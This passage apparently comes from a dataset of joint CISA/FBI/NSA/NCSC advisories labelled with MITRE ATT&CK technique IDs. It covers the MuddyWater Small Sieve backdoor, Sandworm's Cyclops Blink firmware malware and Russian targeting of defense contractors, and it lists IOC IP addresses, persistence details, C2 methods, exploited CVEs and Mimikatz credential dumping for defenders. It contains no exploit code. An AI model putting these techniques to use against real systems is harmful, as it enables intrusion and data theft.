Enable antivirus and anti-malware software and update signature definitions in a timely manner. Well-maintained antivirus software may prevent use of commonly deployed attacker tools that are delivered via spearphishing. 
Be suspicious of unsolicited contact via email or social media from any individual you do not know personally. Do not click on hyperlinks or open attachments in these communications.
Consider adding an email banner to emails received from outside your organization and disabling hyperlinks in received emails.
Train users through awareness and simulations to recognize and report phishing and social engineering attempts. Identify and suspend access of user accounts exhibiting unusual activity.
Adopt threat reputation services at the network device, operating system, application, and email service levels. Reputation services can be used to detect or prevent low-reputation email addresses, files, URLs, and IP addresses used in spearphishing attacks. 

Vulnerability and Configuration Management

Install updates/patch operating systems, software, and firmware as soon as updates/patches are released. Prioritize patching known exploited vulnerabilities.

Additional Resources

For more information on Iranian government-sponsored malicious cyber activity, see CISA's webpage – Iran Cyber Threat Overview and Advisories and CNMF's press release – Iranian intel cyber suite of malware uses open source tools. 
For information and resources on protecting against and responding to ransomware, refer to StopRansomware.gov, a centralized, whole-of-government webpage providing ransomware resources and alerts.
The joint advisory from the cybersecurity authorities of Australia, Canada, New Zealand, the United Kingdom, and the United States: Technical Approaches to Uncovering and Remediating Malicious Activity provides additional guidance when hunting or investigating a network and common mistakes to avoid in incident handling.
CISA offers a range of no-cost cyber hygiene services to help critical infrastructure organizations assess, identify, and reduce their exposure to threats, including ransomware. By requesting these services, organizations of any size could find ways to reduce their risk and mitigate attack vectors.
The U.S. Department of State’s Rewards for Justice (RFJ) program offers a reward of up to $10 million for reports of foreign government malicious activity against U.S. critical infrastructure. See the RFJ website for more information and how to report information securely.

References,1, CNMF Article: Iranian Intel Cyber Suite of Malware Uses Open Source Tools,2, MITRE ATT&CK: MuddyWater 
Caveats
The information you have accessed or received is being provided “as is” for informational purposes only. The FBI, CISA, CNMF, and NSA do not endorse any commercial product or service, including any subjects of analysis. Any reference to specific commercial products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply their endorsement, recommendation, or favoring by the FBI, CISA, CNMF, or NSA.
Purpose
This document was developed by the FBI, CISA, CNMF, NCSC-UK, and NSA in furtherance of their respective cybersecurity missions, including their responsibilities to develop and issue cybersecurity specifications and mitigations. This information may be shared broadly to reach all appropriate stakeholders. The United States’ NSA agrees with this attribution and the details provided in this report.
Appendix A: IOCs
The following IP addresses are associated with MuddyWater activity:
5.199.133,.,149
45.142.213,.,17    
45.142.212,.,61
45.153.231,.,104 
46.166.129,.,159 
80.85.158,.,49 
87.236.212,.,22
88.119.170,.,124 
88.119.171,.,213
89.163.252,.,232
95.181.161,.,49
95.181.161,.,50
164.132.237,.,65
185.25.51,.,108
185.45.192,.,228 
185.117.75,.,34
185.118.164,.,21
185.141.27,.,143
185.141.27,.,248 
185.183.96,.,7
185.183.96,.,44
192.210.191,.,188
192.210.226,.,128
Appendix B: Small Sieve
Note: the information contained in this appendix is from NCSC-UK analysis of a Small Sieve sample.
Metadata
Table 2: Gram.app.exe Metadata

 
Table 3: Index.exe Metadata

 
Functionality 
Installation 
Small Sieve is distributed as a large (16MB) NSIS installer named gram_app.exe, which does not appear to masquerade as a legitimate application. Once executed, the backdoor binary index.exe is installed in the user’s AppData/Roaming directory and is added as a Run key in the registry to enabled persistence after reboot. 
The installer then executes the backdoor with the “Platypus” argument, which is also present in the registry persistence key: HKCU\Software\Microsoft\Windows\CurrentVersion\Run\OutlookMicrosift. 
Configuration 
The backdoor attempts to restore previously initialized session data from %LocalAppData%\MicrosoftWindowsOutlookDataPlus.txt. 
If this file does not exist, then it uses the hardcoded values listed in table 4:
Table 4: Credentials and Session Values

 
Tasking 
Small Sieve beacons via the Telegram Bot API, sending the configured Bot ID, the currently logged-in user, and the host’s IP address, as described in the Communications (Beacon format) section below. It then waits for tasking as a Telegram bot using the python-telegram-bot module. 
Two task formats are supported: 

/start – no argument is passed; this causes the beacon information to be repeated. 
/com,BotID,command, – for issuing commands passed in the argument. 

The following commands are supported by the second of these formats, as described in table 5: 
Table 5: Supported Commands

 
Any commands other than those detailed in table 5 are executed directly by passing them to cmd.exe /c, and the output is returned as a reply.
Defense Evasion 
Anti-Sandbox 

Figure 1: Execution Guardrail
Threat actors may be attempting to thwart simple analysis by not passing “Platypus” on the command line. 
String obfuscation 
Internal strings and new Telegram tokens are stored obfuscated with a custom alphabet and Base64-encoded. A decryption script is included in Appendix B.
Communications 
Beacon Format 
Before listening for tasking using CommandHandler objects from the python-telegram-bot module, a beacon is generated manually using the standard requests library:

Figure 2: Manually Generated Beacon
The hex host data is encoded using the byte shuffling algorithm as described in the “Communications (Traffic obfuscation)” section of this report. The example in figure 2 decodes to: 
admin/WINDOMAIN1 | 10.17.32.18
 
Traffic obfuscation 
Although traffic to the Telegram Bot API is protected by TLS, Small Sieve obfuscates its tasking and response using a hex byte shuffling algorithm. A Python3 implementation is shown in figure 3.
 

Figure 3: Traffic Encoding Scheme Based on Hex Conversion and Shuffling
 
Detection 
Table 6 outlines indicators of compromise.
 
Table 6: Indicators of Compromise

 
String Recover Script

Figure 4: String Recovery Script

Contact Information

To report suspicious or criminal activity related to information found in this joint Cybersecurity Advisory, contact your local FBI field office at www.fbi.gov/contact-us/field-offices, or the FBI’s 24/7 Cyber Watch (CyWatch) at (855) 292-3937 or by email at CyWatch@fbi.gov. When available, please include the following information regarding the incident: date, time, and location of the incident; type of activity; number of people affected; type of equipment used for the activity; the name of the submitting company or organization; and a designated point of contact. To request incident response resources or technical assistance related to these threats, contact CISA at Central@cisa.dhs.gov. For NSA client requirements or general cybersecurity inquiries, contact the Cybersecurity Requirements Center at Cybersecurity_Requests@nsa.gov. United Kingdom organizations should report a significant cyber security incident: ncsc.gov.uk/report-an-incident (monitored 24 hours) or for urgent assistance call 03000 200 973.

Revisions

February 24, 2022: Initial Version






This product is provided subject to this Notification and this Privacy & Use policy.


",https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-055a
54,"




Summary

The Sandworm actor, which the United Kingdom and the United States have previously attributed to the Russian GRU, has replaced the exposed VPNFilter malware with a new more advanced framework.
The United Kingdom's (UK) National Cyber Security Centre (NCSC), the Cybersecurity and Infrastructure Security Agency (CISA), the National Security Agency (NSA), and the Federal Bureau of Investigation (FBI) in the U.S. have identified that the actor known as Sandworm or Voodoo Bear is using a new malware, referred to here as Cyclops Blink. The NCSC, CISA, and the FBI have previously attributed the Sandworm actor to the Russian General Staff Main Intelligence Directorate’s Russian (GRU’s) Main Centre for Special Technologies (GTsST). The malicious cyber activity below has previously been attributed to Sandworm:

The BlackEnergy disruption of Ukrainian electricity in 2015
Industroyer in 2016
NotPetya in 2017
Attacks against the Winter Olympics and Paralympics in 2018 
A series of disruptive attacks against Georgia in 2019

Cyclops Blink appears to be a replacement framework for the VPNFilter malware exposed in 2018, and which exploited network devices, primarily small office/home office (SOHO) routers and network attached storage (NAS) devices.
This advisory summarizes the VPNFilter malware it replaces, and provides more detail on Cyclops Blink, as well as the associated tactics, techniques and procedures (TTPs) used by Sandworm. An NCSC malware analysis report on Cyclops Blink is also available.
It also provides mitigation measures to help organizations defend against malware.
Click here for a PDF version of this report.

Technical Details

VPNFilter
The malware was first exposed in 2018
A series of articles published by Cisco Talos in 2018 describes VPNFilter and its modules in detail. VPNFilter was deployed in stages, with most functionality in the third-stage modules. These modules enabled traffic manipulation, destruction of the infected host device, and likely enabled downstream devices to be exploited. They also allowed monitoring of Modbus SCADA protocols, which appears to be an ongoing requirement for Sandworm, as also seen in their previous attacks against ICS networks.
VPNFilter targeting was widespread and appeared indiscriminate, with some exceptions: Cisco Talos reported an increase of victims in Ukraine in May 2018. Sandworm also deployed VPNFilter against targets in the Republic of Korea before the 2018 Winter Olympics. 
In May 2018, Cisco Talos published the blog that exposed VPNFilter and the U.S. Department of Justice linked the activity to Sandworm and announced efforts to disrupt the botnet.
Activity since its exposure 
A Trendmicro blog in January 2021 detailed residual VPNFilter infections and provided data which showed that although there had been a reduction in requests to a known C2 domain, there was still more than a third of the original number of first-stage infections.
Sandworm has since shown limited interest in existing VPNFilter footholds, instead preferring to retool.
Cyclops Blink
Active since 2019
The NCSC, CISA, the FBI, and NSA, along with industry partners, have now identified a large-scale modular malware framework (T1129) which is targeting network devices. The new malware is referred to here as Cyclops Blink and has been deployed since at least June 2019, fourteen months after VPNFilter was disrupted. In common with VPNFilter, Cyclops Blink deployment also appears indiscriminate and widespread.
The actor has so far primarily deployed Cyclops Blink to WatchGuard devices, but it is likely that Sandworm would be capable of compiling the malware for other architectures and firmware.
Note: Note that only WatchGuard devices that were reconfigured from the manufacturer default settings to open remote management interfaces to external access could be infected
Malware overview 
The malware itself is sophisticated and modular with basic core functionality to beacon (T1132.002) device information back to a server and enable files to be downloaded and executed. There is also functionality to add new modules while the malware is running, which allows Sandworm to implement additional capability as required.
The NCSC has published a malware analysis report on Cyclops Blink which provides more detail about the malware.
Post exploitation 
Post exploitation, Cyclops Blink is generally deployed as part of a firmware ‘update’ (T1542.001). This achieves persistence when the device is rebooted and makes remediation harder.
Victim devices are organized into clusters and each deployment of Cyclops Blink has a list of command and control (C2) IP addresses and ports that it uses (T1008). All the known C2 IP addresses to date have been used by compromised WatchGuard firewall devices. Communications between Cyclops Blink clients and servers are protected under Transport Layer Security (TLS) (T1071.001), using individually generated keys and certificates. Sandworm manages Cyclops Blink by connecting to the C2 layer through the Tor network.


Mitigations

Cyclops Blink persists on reboot and throughout the legitimate firmware update process. Affected organizations should therefore take steps to remove the malware. 
WatchGuard has worked closely with the FBI, CISA, NSA and the NCSC, and has provided tooling and guidance to enable detection and removal of Cyclops Blink on WatchGuard devices through a non-standard upgrade process. Device owners should follow each step in these instructions to ensure that devices are patched to the latest version and that any infection is removed.
The tooling and guidance from WatchGuard can be found at: https://detection.watchguard.com/.
In addition:

If your device is identified as infected with Cyclops Blink, you should assume that any passwords present on the device have been compromised and replace them (see NCSC password guidance for organizations.
You should ensure that the management interface of network devices is not exposed to the internet.

Indicators of Compromise
Please refer to the accompanying Cyclops Blink malware analysis report for indicators of compromise which may help detect this activity. 
MITRE ATT&CK®
This advisory has been compiled with respect to the MITRE ATT&CK® framework, a globally accessible knowledge base of adversary tactics and techniques based on real-world observations.




Tactic


Technique


Procedure




Initial Access


T1133


External Remote Services
The actors most likely deploy modified device firmware images by exploiting an externally available service




Execution


T1059.004


Command and Scripting Interpreter: Unix Shell
Cyclops Blink executes downloaded files using the Linux API




Persistence


T1542.001


Pre-OS Boot: System Firmware
Cyclops Blink is deployed within a modified device firmware image




T1037.004


Boot or Logon Initialization Scripts: RC Scripts
Cyclops Blink is executed on device startup, using a modified RC script



Defense Evasion

 
T1562.004


Impair Defenses: Disable or Modify System Firewall
Cyclops Blink modifies the Linux system firewall to enable C2 communication



 

 
T1036.005


Masquerading: Match Legitimate Name or Location
Cyclops Blink masquerades as a Linux kernel thread process




Discovery


T1082


System Information Discovery
Cyclops Blink regularly queries device information




Command and Control


T1090


Proxy




T1132.002


Data Encoding: Non-Standard Encoding
Cyclops Blink command messages use a custom binary scheme to encode data




T1008


Fallback Channels
Cyclops Blink randomly selects a C2 server from contained lists of IPv4 addresses and port numbers




T1071.001


Application Layer Protocol: Web Protocols
Cyclops Blink can download files via HTTP or HTTPS




T1573.002


Encrypted Channel: Asymmetric Cryptography
Cyclops Blink C2 messages are individually encrypted using AES-256-CBC and sent underneath TLS




T1571


Non-Standard Port
The list of port numbers used by Cyclops Blink includes non-standard ports not typically associated with HTTP or HTTPS traffic



Exfiltration

T1041


Exfiltration Over C2 Channel
Cyclops Blink can upload files to a C2 server




A Cyclops Blink infection does not mean that an organization is the primary target, but it may be selected to be, or its machines could be used to conduct attacks.
Organizations are advised to follow the mitigation advice in this advisory to defend against this activity, and to refer to indicators of compromise (not exhaustive) in the Cyclops Blink malware analysis report to detect possible activity on networks. 
UK organizations affected by the activity outlined in should report any suspected compromises to the NCSC at https://report.ncsc.gov.uk/.
Further Guidance
A variety of mitigations will be of use in defending against the malware featured in this advisory:

Do not expose management interfaces of network devices to the internet: the management interface is a significant attack surface, so not exposing them reduces the risk. See NCSC guidance: https://www.ncsc.gov.uk/guidance/acquiring-managing-and-disposing-network-devices.
Protect your devices and networks by keeping them up to date: use the latest supported versions, apply security patches promptly, use anti-virus and scan regularly to guard against known malware threats. See NCSC guidance: https://www.ncsc.gov.uk/guidance/mitigating-malware.
Use multi-factor authentication to reduce the impact of password compromises. See NCSC guidance: https://www.ncsc.gov.uk/guidance/multi-factor-authentication-online-services and https://www.ncsc.gov.uk/guidance/setting-two-factor-authentication-2fa.
Treat people as your first line of defense. Tell staff how to report suspected phishing emails, and ensure they feel confident to do so. Investigate their reports promptly and thoroughly. Never punish users for clicking phishing links or opening attachments. See NCSC guidance: https://www.ncsc.gov.uk/phishing. 
Set up a security monitoring capability so you are collecting the data that will be needed to analyze network intrusions. See NCSC Guidance: https://www.ncsc.gov.uk/guidance/introduction-logging-security-purposes. 
Prevent and detect lateral movement in your organization’s networks. See NCSC guidance: https://www.ncsc.gov.uk/guidance/preventing-lateral-movement.

About This Document
This advisory is the result of a collaborative effort by United Kingdom’s National Cyber Security Centre (NCSC), the United States’ National Security Agency (NSA), the Federal Bureau of Investigation (FBI), and Department of Homeland Security (DHS) Cybersecurity and Infrastructure Security Agency (CISA). 
CISA, FBI, and NSA agree with this attribution and the details provided in the report.
This advisory has been compiled with respect to the MITRE ATT&CK® framework, a globally accessible knowledge base of adversary tactics and techniques based on real-world observations. 
Disclaimers
This report draws on information derived from NCSC and industry sources. Any NCSC findings and recommendations made have not been provided with the intention of avoiding all risks and following the recommendations will not remove all such risk. Ownership of information risks remains with the relevant system owner at all times.
Disclaimer of Endorsement: The information and opinions contained in this document are provided ""as is"" and without any warranties or guarantees. Reference herein to any specific commercial products, process, or service by trade name, trademark, manufacturer, or otherwise, does not constitute or imply its endorsement, recommendation, or favoring by the United States Government, and this guidance shall not be used for advertising or product endorsement purposes.
For NSA client requirements or general cybersecurity inquiries, contact the Cybersecurity Requirements Center at 410-854-4200 or Cybersecurity_Requests@nsa.gov.

Contact Information

To report suspicious or criminal activity related to information found in this joint Cybersecurity Advisory:
U.S. organizations contact your local FBI field office at fbi.gov/contact-us/field-offices, or the FBI’s 24/7 Cyber Watch (CyWatch) at (855) 292-3937 or by email at CyWatch@fbi.gov. When available, please include the following information regarding the incident: date, time, and location of the incident; type of activity; number of people affected; type of equipment used for the activity; the name of the submitting company or organization; and a designated point of contact. To request incident response resources or technical assistance related to these threats, contact CISA at Central@cisa.gov.
Australian organizations should report incidents to the Australian Signals Directorate’s (ASD’s) ACSC via cyber.gov.au or call 1300 292 371 (1300 CYBER 1).
U.K. organizations should report a significant cyber security incident: ncsc.gov.uk/report-an-incident (monitored 24 hrs) or for urgent assistance, call 03000 200 973.

Revisions

February 23, 2022: Initial Version






This product is provided subject to this Notification and this Privacy & Use policy.


","{'T1041', 'T1542.001', 'T1573.002', 'T1090', 'T1036.005', 'T1071.001', 'T1082', 'T1037.004', 'T1132.002', 'T1133', 'T1008', 'T1059.004', 'T1571', 'T1562.004', 'T1129'}","




Summary

The Sandworm actor, which the United Kingdom and the United States have previously attributed to the Russian GRU, has replaced the exposed VPNFilter malware with a new more advanced framework.
The United Kingdom's (UK) National Cyber Security Centre (NCSC), the Cybersecurity and Infrastructure Security Agency (CISA), the National Security Agency (NSA), and the Federal Bureau of Investigation (FBI) in the U.S. have identified that the actor known as Sandworm or Voodoo Bear is using a new malware, referred to here as Cyclops Blink. The NCSC, CISA, and the FBI have previously attributed the Sandworm actor to the Russian General Staff Main Intelligence Directorate’s Russian (GRU’s) Main Centre for Special Technologies (GTsST). The malicious cyber activity below has previously been attributed to Sandworm:

The BlackEnergy disruption of Ukrainian electricity in 2015
Industroyer in 2016
NotPetya in 2017
Attacks against the Winter Olympics and Paralympics in 2018 
A series of disruptive attacks against Georgia in 2019

Cyclops Blink appears to be a replacement framework for the VPNFilter malware exposed in 2018, and which exploited network devices, primarily small office/home office (SOHO) routers and network attached storage (NAS) devices.
This advisory summarizes the VPNFilter malware it replaces, and provides more detail on Cyclops Blink, as well as the associated tactics, techniques and procedures (TTPs) used by Sandworm. An NCSC malware analysis report on Cyclops Blink is also available.
It also provides mitigation measures to help organizations defend against malware.
Click here for a PDF version of this report.

Technical Details

VPNFilter
The malware was first exposed in 2018
A series of articles published by Cisco Talos in 2018 describes VPNFilter and its modules in detail. VPNFilter was deployed in stages, with most functionality in the third-stage modules. These modules enabled traffic manipulation, destruction of the infected host device, and likely enabled downstream devices to be exploited. They also allowed monitoring of Modbus SCADA protocols, which appears to be an ongoing requirement for Sandworm, as also seen in their previous attacks against ICS networks.
VPNFilter targeting was widespread and appeared indiscriminate, with some exceptions: Cisco Talos reported an increase of victims in Ukraine in May 2018. Sandworm also deployed VPNFilter against targets in the Republic of Korea before the 2018 Winter Olympics. 
In May 2018, Cisco Talos published the blog that exposed VPNFilter and the U.S. Department of Justice linked the activity to Sandworm and announced efforts to disrupt the botnet.
Activity since its exposure 
A Trendmicro blog in January 2021 detailed residual VPNFilter infections and provided data which showed that although there had been a reduction in requests to a known C2 domain, there was still more than a third of the original number of first-stage infections.
Sandworm has since shown limited interest in existing VPNFilter footholds, instead preferring to retool.
Cyclops Blink
Active since 2019
The NCSC, CISA, the FBI, and NSA, along with industry partners, have now identified a large-scale modular malware framework () which is targeting network devices. The new malware is referred to here as Cyclops Blink and has been deployed since at least June 2019, fourteen months after VPNFilter was disrupted. In common with VPNFilter, Cyclops Blink deployment also appears indiscriminate and widespread.
The actor has so far primarily deployed Cyclops Blink to WatchGuard devices, but it is likely that Sandworm would be capable of compiling the malware for other architectures and firmware.
Note: Note that only WatchGuard devices that were reconfigured from the manufacturer default settings to open remote management interfaces to external access could be infected
Malware overview 
The malware itself is sophisticated and modular with basic core functionality to beacon () device information back to a server and enable files to be downloaded and executed. There is also functionality to add new modules while the malware is running, which allows Sandworm to implement additional capability as required.
The NCSC has published a malware analysis report on Cyclops Blink which provides more detail about the malware.
Post exploitation 
Post exploitation, Cyclops Blink is generally deployed as part of a firmware ‘update’ (). This achieves persistence when the device is rebooted and makes remediation harder.
Victim devices are organized into clusters and each deployment of Cyclops Blink has a list of command and control (C2) IP addresses and ports that it uses (). All the known C2 IP addresses to date have been used by compromised WatchGuard firewall devices. Communications between Cyclops Blink clients and servers are protected under Transport Layer Security (TLS) (), using individually generated keys and certificates. Sandworm manages Cyclops Blink by connecting to the C2 layer through the Tor network.


Mitigations

Cyclops Blink persists on reboot and throughout the legitimate firmware update process. Affected organizations should therefore take steps to remove the malware. 
WatchGuard has worked closely with the FBI, CISA, NSA and the NCSC, and has provided tooling and guidance to enable detection and removal of Cyclops Blink on WatchGuard devices through a non-standard upgrade process. Device owners should follow each step in these instructions to ensure that devices are patched to the latest version and that any infection is removed.
The tooling and guidance from WatchGuard can be found at: https://detection.watchguard.com/.
In addition:

If your device is identified as infected with Cyclops Blink, you should assume that any passwords present on the device have been compromised and replace them (see NCSC password guidance for organizations.
You should ensure that the management interface of network devices is not exposed to the internet.

Indicators of Compromise
Please refer to the accompanying Cyclops Blink malware analysis report for indicators of compromise which may help detect this activity. 
MITRE ATT&CK®
This advisory has been compiled with respect to the MITRE ATT&CK® framework, a globally accessible knowledge base of adversary tactics and techniques based on real-world observations.

A Cyclops Blink infection does not mean that an organization is the primary target, but it may be selected to be, or its machines could be used to conduct attacks.
Organizations are advised to follow the mitigation advice in this advisory to defend against this activity, and to refer to indicators of compromise (not exhaustive) in the Cyclops Blink malware analysis report to detect possible activity on networks. 
UK organizations affected by the activity outlined in should report any suspected compromises to the NCSC at https://report.ncsc.gov.uk/.
Further Guidance
A variety of mitigations will be of use in defending against the malware featured in this advisory:

Do not expose management interfaces of network devices to the internet: the management interface is a significant attack surface, so not exposing them reduces the risk. See NCSC guidance: https://www.ncsc.gov.uk/guidance/acquiring-managing-and-disposing-network-devices.
Protect your devices and networks by keeping them up to date: use the latest supported versions, apply security patches promptly, use anti-virus and scan regularly to guard against known malware threats. See NCSC guidance: https://www.ncsc.gov.uk/guidance/mitigating-malware.
Use multi-factor authentication to reduce the impact of password compromises. See NCSC guidance: https://www.ncsc.gov.uk/guidance/multi-factor-authentication-online-services and https://www.ncsc.gov.uk/guidance/setting-two-factor-authentication-2fa.
Treat people as your first line of defense. Tell staff how to report suspected phishing emails, and ensure they feel confident to do so. Investigate their reports promptly and thoroughly. Never punish users for clicking phishing links or opening attachments. See NCSC guidance: https://www.ncsc.gov.uk/phishing. 
Set up a security monitoring capability so you are collecting the data that will be needed to analyze network intrusions. See NCSC Guidance: https://www.ncsc.gov.uk/guidance/introduction-logging-security-purposes. 
Prevent and detect lateral movement in your organization’s networks. See NCSC guidance: https://www.ncsc.gov.uk/guidance/preventing-lateral-movement.

About This Document
This advisory is the result of a collaborative effort by United Kingdom’s National Cyber Security Centre (NCSC), the United States’ National Security Agency (NSA), the Federal Bureau of Investigation (FBI), and Department of Homeland Security (DHS) Cybersecurity and Infrastructure Security Agency (CISA). 
CISA, FBI, and NSA agree with this attribution and the details provided in the report.
This advisory has been compiled with respect to the MITRE ATT&CK® framework, a globally accessible knowledge base of adversary tactics and techniques based on real-world observations. 
Disclaimers
This report draws on information derived from NCSC and industry sources. Any NCSC findings and recommendations made have not been provided with the intention of avoiding all risks and following the recommendations will not remove all such risk. Ownership of information risks remains with the relevant system owner at all times.
Disclaimer of Endorsement: The information and opinions contained in this document are provided ""as is"" and without any warranties or guarantees. Reference herein to any specific commercial products, process, or service by trade name, trademark, manufacturer, or otherwise, does not constitute or imply its endorsement, recommendation, or favoring by the United States Government, and this guidance shall not be used for advertising or product endorsement purposes.
For NSA client requirements or general cybersecurity inquiries, contact the Cybersecurity Requirements Center at 410-854-4200 or Cybersecurity_Requests@nsa.gov.

Contact Information

To report suspicious or criminal activity related to information found in this joint Cybersecurity Advisory:
U.S. organizations contact your local FBI field office at fbi.gov/contact-us/field-offices, or the FBI’s 24/7 Cyber Watch (CyWatch) at (855) 292-3937 or by email at CyWatch@fbi.gov. When available, please include the following information regarding the incident: date, time, and location of the incident; type of activity; number of people affected; type of equipment used for the activity; the name of the submitting company or organization; and a designated point of contact. To request incident response resources or technical assistance related to these threats, contact CISA at Central@cisa.gov.
Australian organizations should report incidents to the Australian Signals Directorate’s (ASD’s) ACSC via cyber.gov.au or call 1300 292 371 (1300 CYBER 1).
U.K. organizations should report a significant cyber security incident: ncsc.gov.uk/report-an-incident (monitored 24 hrs) or for urgent assistance, call 03000 200 973.

Revisions

February 23, 2022: Initial Version






This product is provided subject to this Notification and this Privacy & Use policy.


",https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-054a
55,"




Summary

Actions to Help Protect Against Russian State-Sponsored Malicious Cyber Activity:
• Enforce multifactor authentication.
• Enforce strong, unique passwords.
• Enable M365 Unified Audit Logs.
• Implement endpoint detection and response tools.
From at least January 2020, through February 2022, the Federal Bureau of Investigation (FBI), National Security Agency (NSA), and Cybersecurity and Infrastructure Security Agency (CISA) have observed regular targeting of U.S. cleared defense contractors (CDCs) by Russian state-sponsored cyber actors. The actors have targeted both large and small CDCs and subcontractors with varying levels of cybersecurity protocols and resources. These CDCs support contracts for the U.S. Department of Defense (DoD) and Intelligence Community in the following areas:

Command, control, communications, and combat systems;
Intelligence, surveillance, reconnaissance, and targeting;
Weapons and missile development;
Vehicle and aircraft design; and
Software development, data analytics, computers, and logistics. 

Historically, Russian state-sponsored cyber actors have used common but effective tactics to gain access to target networks, including spearphishing, credential harvesting, brute force/password spray techniques, and known vulnerability exploitation against accounts and networks with weak security. These actors take advantage of simple passwords, unpatched systems, and unsuspecting employees to gain initial access before moving laterally through the network to establish persistence and exfiltrate data. 
In many attempted compromises, these actors have employed similar tactics to gain access to enterprise and cloud networks, prioritizing their efforts against the widely used Microsoft 365 (M365) environment. The actors often maintain persistence by using legitimate credentials and a variety of malware when exfiltrating emails and data.
These continued intrusions have enabled the actors to acquire sensitive, unclassified information, as well as CDC-proprietary and export-controlled technology. The acquired information provides significant insight into U.S. weapons platforms development and deployment timelines, vehicle specifications, and plans for communications infrastructure and information technology. By acquiring proprietary internal documents and email communications, adversaries may be able to adjust their own military plans and priorities, hasten technological development efforts, inform foreign policymakers of U.S. intentions, and target potential sources for recruitment. Given the sensitivity of information widely available on unclassified CDC networks, the FBI, NSA, and CISA anticipate that Russian state-sponsored cyber actors will continue to target CDCs for U.S. defense information in the near future. These agencies encourage all CDCs to apply the recommended mitigations in this advisory, regardless of evidence of compromise.
For additional information on Russian state-sponsored cyber activity, see CISA's webpage, Russia Cyber Threat Overview and Advisories.
Click here for a PDF version of this report.
Threat Details
Targeted Industries and Assessed Motive
Russian state-sponsored cyber actors have targeted U.S. CDCs from at least January 2020, through February 2022. The actors leverage access to CDC networks to obtain sensitive data about U.S. defense and intelligence programs and capabilities. Compromised entities have included CDCs supporting the U.S. Army, U.S. Air Force, U.S. Navy, U.S. Space Force, and DoD and Intelligence programs.
During this two-year period, these actors have maintained persistent access to multiple CDC networks, in some cases for at least six months. In instances when the actors have successfully obtained access, the FBI, NSA, and CISA have noted regular and recurring exfiltration of emails and data. For example, during a compromise in 2021, threat actors exfiltrated hundreds of documents related to the company’s products, relationships with other countries, and internal personnel and legal matters.
Through these intrusions, the threat actors have acquired unclassified CDC-proprietary and export-controlled information. This theft has granted the actors significant insight into U.S. weapons platforms development and deployment timelines, plans for communications infrastructure, and specific technologies employed by the U.S. government and military. Although many contract awards and descriptions are publicly accessible, program developments and internal company communications remain sensitive. Unclassified emails among employees or with government customers often contain proprietary details about technological and scientific research, in addition to program updates and funding statuses. See figures 1 and 2 for information on targeted customers, industries, and information.
 

Figure 1. Targeted Industries
 

Figure 2. Exfiltrated Information
 
Threat Actor Activity
Note: This advisory uses the MITRE ATT&CK® for Enterprise framework, version 10. See the ATT&CK for Enterprise for all referenced threat actor tactics and techniques. See the Tactics, Techniques, and Procedures (TTPs) section for a table of the threat actors’ activity mapped to MITRE ATT&CK tactics and techniques.
Initial Access 
Russian state-sponsored cyber actors use brute force methods, spearphishing, harvested credentials, and known vulnerabilities to gain initial access to CDC networks.

Threat actors use brute force techniques [T1110] to identify valid account credentials [T1589.001] for domain and M365 accounts. After obtaining domain credentials, the actors use them to gain initial access to the networks. Note: For more information, see joint NSA-FBI-CISA Cybersecurity Advisory: Russian GRU Conducting Global Brute Force Campaign to Compromise Enterprise and Cloud Environments.
Threat actors send spearphishing emails with links to malicious domains [T1566.002] and use publicly available URL shortening services to mask the link [T1027]. Embedding shortened URLs instead of actor-controlled malicious domains is an obfuscation technique meant to bypass virus and spam scanning tools. The technique often promotes a false legitimacy to the email recipient, increasing the probability of a victim’s clicking on the link. 
The threat actors use harvested credentials in conjunction with known vulnerabilities—for example, CVE-2020-0688 and CVE-2020-17144—on public-facing applications [T1078, T1190], such as virtual private networks (VPNs), to escalate privileges and gain remote code execution (RCE) on the exposed applications.[1] In addition, threat actors have exploited CVE-2018-13379 on FortiClient to obtain credentials to access networks. 
As CDCs find and patch known vulnerabilities on their networks, the actors alter their tradecraft to seek new means of access. This activity necessitates CDCs maintain constant vigilance for software vulnerabilities and out-of-date security configurations, especially in internet-facing systems.

Credential Access 
After gaining access to networks, the threat actors map the Active Directory (AD) and connect to domain controllers, from which they exfiltrate credentials and export copies of the AD database ntds.dit [T1003.003]. In multiple instances, the threat actors have used Mimikatz to dump admin credentials from the domain controllers. 
Collection
Using compromised M365 credentials, including global admin accounts, the threat actors can gain access to M365 resources, including SharePoint pages [T1213.002], user profiles, and user emails [T1114.002].
Command and Control
The threat actors routinely use virtual private servers (VPSs) as an encrypted proxy. The actors use VPSs, as well as small office and home office (SOHO) devices, as operational nodes to evade detection [T1090.003].
Persistence
In multiple instances, the threat actors maintained persistent access for at least six months. Although the actors have used a variety of malware to maintain persistence, the FBI, NSA, and CISA have also observed intrusions that did not rely on malware or other persistence mechanisms. In these cases, it is likely the threat actors relied on possession of legitimate credentials for persistence [T1078], enabling them to pivot to other accounts, as needed, to maintain access to the compromised environments.
Tactics, Techniques, and Procedures
The following table maps observed Russian state-sponsored cyber activity to the MITRE ATT&CK for Enterprise framework. Several of the techniques listed in the table are based on observed procedures in contextual order. Therefore, some of the tactics and techniques listed in their respective columns appear more than once. See Appendix A for a functional breakdown of TTPs. Note: for specific countermeasures related to each ATT&CK technique, see the Enterprise Mitigations section and MITRE D3FEND™.
 
Table 1: Observed Tactics, Techniques, and Procedures (TTPs)



Tactic
Technique
Procedure





Reconnaissance [TA0043]
Credential Access [TA0006]


Gather Victim Identity Information: Credentials [T1589.001] 
Brute Force [T1110]

Threat actors used brute force to identify valid account credentials for domain and M365 accounts. After obtaining domain credentials, the actors used them to gain initial access. 


Initial Access [TA0001]
External Remote Services [T1133]
Threat actors continue to research vulnerabilities in Fortinet’s FortiGate VPN devices, conducting brute force attacks and leveraging CVE-2018-13379 to gain credentials to access victim networks. [2]



Initial Access [TA0001]
Privilege Escalation [TA0004]


Valid Accounts [T1078]
Exploit Public-Facing Application [T1190]

Threat actors used credentials in conjunction with known vulnerabilities on public-facing applications, such as virtual private networks (VPNs)—CVE-2020-0688 and CVE-2020-17144—to escalate privileges and gain remote code execution (RCE) on the exposed applications. [3]



Initial Access [TA0001]

Defense Evasion [TA0005]


Phishing: Spearphishing Link [T1566.002]
Obfuscated Files or Information [T1027]

Threat actors sent spearphishing emails using publicly available URL shortening services. Embedding shortened URLs instead of the actor-controlled malicious domain is an obfuscation technique meant to bypass virus and spam scanning tools. The technique often promotes a false legitimacy to the email recipient and thereby increases the possibility that a victim clicks on the link. 



Initial Access [TA0001]

Credential Access [TA0006]


OS Credential Dumping: NTDS [T1003.003]
Valid Accounts: Domain Accounts [T1078.002]

